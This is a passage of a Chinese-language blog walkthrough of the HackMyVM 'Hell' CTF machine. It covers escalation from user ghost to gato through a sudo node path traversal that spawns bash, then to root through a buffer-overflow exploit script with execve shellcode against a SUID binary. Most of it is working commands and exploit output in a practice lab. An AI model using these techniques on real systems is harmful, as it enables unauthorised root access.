<pre class="language-bash" data-language="bash"><code class="language-bash">eddie@hell:/var/mail$ <span class="token function">cat</span> eddie

From: ghost@hall.h4u

Hi eddie, can you see my hacked facebook account, I leave you the last password I remember: MySuperSecurePassword123<span class="token operator">!</span></code></pre>
<p>拿到ghost的密码<code>MySuperSecurePassword123!</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ghost@hell:~$ <span class="token function">cat</span> flag.txt 

█▀█ █▄▄ █▀▀ ▀▄▀ █▀▀ █ █ █▀█ █▀ ▀█▀
█▄█ █▄█ █▀  █ █ █▄█ █▀█ █▄█ ▄█  █ 

Flag <span class="token number">9</span>: HELL<span class="token punctuation">&#123;</span>B14CKH47_H4CK3R_F4C3B00K_WTF?<span class="token punctuation">&#125;</span></code></pre>
<p>拿到第九个flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ghost@hell:~$ <span class="token function">cat</span> message.txt 

From: gatogamer1155@hell.h4u

Hi ghost, just a heads up I created a script <span class="token keyword">in</span> node.js that converts text to hexadecimal, I<span class="token string">'ll leave it at my home directory for you to try, it'</span>s called hex.js <span class="token builtin class-name">:</span><span class="token punctuation">)</span></code></pre>
<p>去gato目录看这个文件,不过得先提权到gato</p>
<h2 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h2><pre class="language-bash" data-language="bash"><code class="language-bash">ghost@hell:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> ghost: 
Matching Defaults entries <span class="token keyword">for</span> ghost on hell:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin, use_pty

User ghost may run the following commands on hell:
    <span class="token punctuation">(</span>gato<span class="token punctuation">)</span> /usr/bin/node /home/gato/*</code></pre>
<p>可以将gato目录下面的文件执行node命令,好眼熟，尝试目录穿越</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ghost@hell:~$ <span class="token builtin class-name">cd</span> /tmp
ghost@hell:/tmp$ <span class="token builtin class-name">echo</span> <span class="token string">'require("child_process").spawn("/bin/bash", &#123;stdio: [0, 1, 2]&#125;)'</span> <span class="token operator">></span> shell.js
ghost@hell:/tmp$ <span class="token function">chmod</span> +x shell.js
ghost@hell:/tmp$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> gato <span class="token function">node</span> /home/gato/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/tmp/shell.js
gato@hell:/tmp$ </code></pre>
<p>拿到gato权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gato@hell:~$ <span class="token function">cat</span> flag.txt 

█▀▀ ▄▀█ ▀█▀ █▀█ █▀▀ ▄▀█ █▀▄▀█ █▀▀ █▀█ ▄█ ▄█ █▀ █▀
█▄█ █▀█  █  █▄█ █▄█ █▀█ █ ▀ █ ██▄ █▀▄  █  █ ▄█ ▄█

Flag <span class="token number">10</span>: HELL<span class="token punctuation">&#123;</span>7H3_5UD03R5_15_N07_4_60D_1D34<span class="token punctuation">&#125;</span></code></pre>
<p>拿到第10个flag</p>
<h2 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h2><pre class="language-bash" data-language="bash"><code class="language-bash">gato@hell:~$ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/opt/projects/strlen
/usr/bin/fusermount3
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/sudo
/usr/bin/mount
/usr/bin/gpasswd
/usr/libexec/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine</code></pre>
<p>有个strlen,看起来是求字符串长度</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gato@hell:/opt/projects$ ./strlen 

█▀ ▀█▀ █▀█ █   █▀▀ █▄ █
▄█  █  █▀▄ █▄▄ ██▄ █ ▀█

<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Usage: ./strlen <span class="token operator">&lt;</span>string<span class="token operator">></span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/17/ORzYqX.png" alt="ORzYqX.png" loading="lazy"><br>不会。<br>直接steal一手wp</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> a.py                       
<span class="token comment">#!/usr/bin/python2</span>
from pwn <span class="token function">import</span> *
 
offset <span class="token operator">=</span> <span class="token number">264</span>
shellcode  <span class="token operator">=</span> b<span class="token string">""</span>
shellcode <span class="token operator">+=</span> b<span class="token string">"<span class="token entity" title="\x6a">\x6a</span><span class="token entity" title="\x3b">\x3b</span><span class="token entity" title="\x58">\x58</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\x48">\x48</span><span class="token entity" title="\xbb">\xbb</span><span class="token entity" title="\x2f">\x2f</span>"</span>
shellcode <span class="token operator">+=</span> b<span class="token string">"<span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x62">\x62</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x73">\x73</span><span class="token entity" title="\x68">\x68</span><span class="token entity" title="\x53">\x53</span>"</span>
shellcode <span class="token operator">+=</span> b<span class="token string">"<span class="token entity" title="\x54">\x54</span><span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\x57">\x57</span><span class="token entity" title="\x54">\x54</span><span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\x0f">\x0f</span><span class="token entity" title="\x05">\x05</span>"</span>
nop <span class="token operator">=</span> b<span class="token string">"<span class="token entity" title="\x90">\x90</span>"</span> * <span class="token punctuation">(</span>offset - len<span class="token punctuation">(</span>shellcode<span class="token punctuation">))</span>
rip <span class="token operator">=</span> b<span class="token string">"<span class="token entity" title="\x60">\x60</span><span class="token entity" title="\xe7">\xe7</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\x7f">\x7f</span>"</span>
 
print<span class="token punctuation">(</span>nop + shellcode + rip<span class="token punctuation">)</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> python2 a.py <span class="token operator">></span>a.txt</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">gato@hell:/opt/projects$ ./strlen <span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> a.txt<span class="token variable">)</span></span>

█▀ ▀█▀ █▀█ █   █▀▀ █▄ █
▄█  █  █▀▄ █▄▄ ██▄ █ ▀█

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> String: ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������j<span class="token punctuation">;</span>X�RH�//bin/shST_RWT^`����                                                                                                                                               
                                      
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Length: <span class="token number">270</span>                                                                                                                                                                                               
<span class="token comment"># id                                                                                                                                                                                                   </span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>gato<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>gato<span class="token punctuation">)</span>    </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># cd /root                                                                                                                                                                                                                                                   </span>
<span class="token comment"># ls                                                                                                                                                                                                                                                         </span>
containers  flag.txt                                                                                                                                                                                                                                         
<span class="token comment"># cat flag.txt                                                                                                                                                                                                                                               </span>
                                                                                                                                                                                                                                                             
█▀█ █▀█ █▀█ ▀█▀   █ █ █▀▀ █   █                                                                                                                                                                                                                              
█▀▄ █▄█ █▄█  █    █▀█ ██▄ █▄▄ █▄▄                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                             
Flag <span class="token number">11</span>: HELL<span class="token punctuation">&#123;</span>0V3RF10W_F0R_B3G1NN3R5<span class="token punctuation">&#125;</span>                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                             
Congratulations on completing this CTF<span class="token operator">!</span>    </code></pre>











</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://tao0845.github.io/posts/709c1b3d/" title="HackMyVM-Hell">https://tao0845.github.io/posts/709c1b3d/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/c9c80648/" rel="prev" title="Vulnyx-Eternal"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">Vulnyx-Eternal</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/3a160b8e/" rel="next" title="Vulnyx-Experience"><span class="post-nav-text">Vulnyx-Experience</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>